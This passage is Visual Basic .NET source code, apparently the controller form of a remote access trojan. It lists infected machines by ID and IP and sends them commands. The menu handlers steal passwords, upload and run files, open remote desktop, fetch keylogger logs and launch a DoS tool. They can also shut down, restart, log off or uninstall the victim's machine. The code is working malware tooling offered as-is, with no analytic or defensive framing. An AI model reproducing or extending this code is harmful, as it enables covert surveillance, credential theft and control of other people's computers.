        For Each x As ListViewItem In L1.SelectedItems
            L1.ContextMenuStrip = ContextMenuStrip1
        Next
    End Sub



    Private Sub L1_MouseUp(sender As Object, e As MouseEventArgs)

    End Sub
    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs)



    End Sub

    Private Sub StartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartProcessToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "fun")
            colord()
        Next
    End Sub



    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "sendfile" & "|U|" & n.Name & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                colord()
            Next
        Else

        End If
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromLinkToolStripMenuItem.Click

        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form17.Show()
            End If
        Catch ex As Exception

        End Try


    End Sub
    Private Sub OpenWebSiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenWebSiteToolStripMenuItem.Click


        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form15.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "close")
        Next
    End Sub
    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form18.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "r1")
        Next




    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Dim dr As DialogResult = MessageBox.Show("Are you sure To want to Uninstall Server ?", "Uninstall", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
            If dr = DialogResult.Yes Then
                S.Send(x.ToolTipText, "Uninstall")
            End If
        Next
    End Sub
    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function
    Public Shared Function DEB(ByRef s As String) As String
        Dim str As String
        Dim num As Integer = 0
Label_0002:
        Try
            Dim bytes As Byte() = Convert.FromBase64String(s)
            str = Encoding.UTF8.GetString(bytes)
        Catch exception1 As Exception
            Dim exception As Exception = exception1
            num += 1
            If (num = 3) Then
                str = Nothing
            Else
                s = (s & "=")
                GoTo Label_0002
            End If
        End Try
        Return str
    End Function

    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub GetPasswordsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "++")
            colord()
        Next
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click


        For Each x As ListViewItem In L1.SelectedItems
            Form10.Show()

        Next
    End Sub

    Private Sub CopyIPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyIPToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Clipboard.SetText(L1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        End
    End Sub







    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        ProgressBar1.Increment(50)
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            Timer3.Stop()
            Form2.ShowDialog()
        End If
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "infoDesk")
        Next
    End Sub




    Private Sub gg_Tick(sender As Object, e As EventArgs) Handles gg.Tick
        Me.Opacity = Me.Opacity + 0.1
        If Me.Opacity = 1 Then
            gg.Enabled = False
        End If
    End Sub


    Private Sub PictureBox1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDoubleClick


        For Each x As ListViewItem In L1.SelectedItems
            Form10.Show()

        Next
    End Sub

    Private Sub OpenDownloadFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenDownloadFolderToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            Dim folders = (Application.StartupPath & "/bookbinder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text))

            System.Diagnostics.Process.Start(folders)
        Next


    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click

    End Sub

    Private Sub Timer4_Tick_1(sender As Object, e As EventArgs) Handles Timer4.Tick

        If ToolStripStatusLabel3.Text = "The Case of The Port |- Connected To The Following Port : " & Form2.NumericUpDown1.Value.ToString Then
            If ToolStripStatusLabel3.ForeColor = System.Drawing.SystemColors.HotTrack Then
                Dim rr = My.Resources._23ddd
                Me.ToolStripStatusLabel3.Image = rr
                Timer4.Enabled = False
            Else

            End If
        End If




    End Sub

    Private Sub SdfdsfgdfToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SdfdsfgdfToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "cc")
            colord()
        Next
    End Sub

    Private Sub CommentsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CommentsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Dim folders = (Application.StartupPath & "/bookbinder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\R.txt")



            If File.Exists(folders) Then
                Form19.Show()
            Else

                My.Computer.FileSystem.WriteAllText(folders, "", False)
                Form19.Show()
            End If

            '
        Next
    End Sub

    Private Sub TETEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TETEToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "TETE")
            colord()
        Next
    End Sub

    Private Sub TToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TToolStripMenuItem.Click

        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then



                Dim folders = (Application.StartupPath & "/bookbinder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\" + "tas.txt")
                If File.Exists(folders) Then
                Else

                    My.Computer.FileSystem.WriteAllText(folders, "", False)
                End If
                Form20.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ChToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "chat")
                colord()
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub KloToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KloToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openkl")
            colord()
        Next
        Dim folderss = (Application.StartupPath & "/bookbinder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\logonline.log")
        If File.Exists(folderss) Then
            File.Delete(folderss)
        End If
    End Sub

    Private Sub DosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DosToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form13.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub CLXToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLXToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Clipboard.SetText(L1.SelectedItems.Item(0).SubItems.Item(13).Text)
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub L1_ItemRemoved(sender As Object, e As EventArgs) Handles L1.ItemRemoved



        GClass91.Items.Add("The user logs off : " + " IP : " + ip + " ServerID : " + id + " Time :" + TimeValue(Now))




    End Sub



    Private Sub L1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles L1.MouseDoubleClick
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            Timer1.Start()
            S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub L1_SelectedIndexChanged_1(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        On Error Resume Next

        infg()



    End Sub
    Sub infg()

       

        Dim folders = (Application.StartupPath & "/bookbinder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\Star.01")

        If File.Exists(folders) Then
            PictureBox2.Show()
        Else
            PictureBox2.Hide()
        End If


        id = (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text)
        ip = (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(1).Text)




        If CheckBox1.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "!!")
                End If
            Next
            PictureBox1.Image = Nothing



        End If
        For Each x As ListViewItem In L1.SelectedItems
            Timer2.Start()
            If CheckBox2.Checked = True Then
                S.Send(x.ToolTipText, "infoDesk")
            End If

        Next

        Dim sc As String
        'sc = L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(7).Text
        'Label1.Text = L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(14).Text
        'If Label1.Text = "Powered Charging - 100%" Then
        '    PictureBox3.ImageLocation = "IOS\sys\S2.png"
        'Else
        '    PictureBox3.ImageLocation = "IOS\sys\S1.png"
        'End If






    End Sub
    Private Sub ComputerRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ComputerRestartToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Shutdowns")
        Next
    End Sub

    Private Sub ComputerShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ComputerShutdownToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "sciikxxxwa")
        Next
    End Sub

    Private Sub LogOutComputerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogOutComputerToolStripMenuItem.Click



        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "xxyiazzqk")
        Next
    End Sub


    Private Sub StillnessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StillnessToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Stillness")
        Next
    End Sub





    Private Sub GClass91_SelectedIndexChanged(sender As Object, e As EventArgs) Handles GClass91.SelectedIndexChanged

    End Sub

    Private Sub ServersToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ServersToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ssopen")
            colord()
        Next
    End Sub


    Private Sub GOkaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GOkaToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "life is Beautiful")
            colord()
        Next
    End Sub

    Private Sub ActiveWindowsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ActiveWindowsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Acti")
            colord()
        Next
    End Sub


    Private Sub Label1_Click(sender As Object, e As EventArgs)

    End Sub
End Class


